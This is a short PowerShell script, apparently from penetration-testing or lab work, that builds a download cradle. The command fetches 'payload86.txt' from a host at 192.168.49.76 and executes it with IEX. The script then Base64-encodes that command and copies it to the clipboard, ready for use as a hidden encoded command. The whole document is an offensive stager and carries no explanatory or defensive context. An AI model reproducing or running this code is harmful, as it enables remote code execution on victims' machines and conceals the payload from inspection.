$command = '(New-Object System.Net.Webclient).DownloadString("http://192.168.49.76/payload86.txt") | IEX'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command)) | Clip
#$encodedCommand = [Convert]::ToBase64String($bytes)
#$encodedCommand
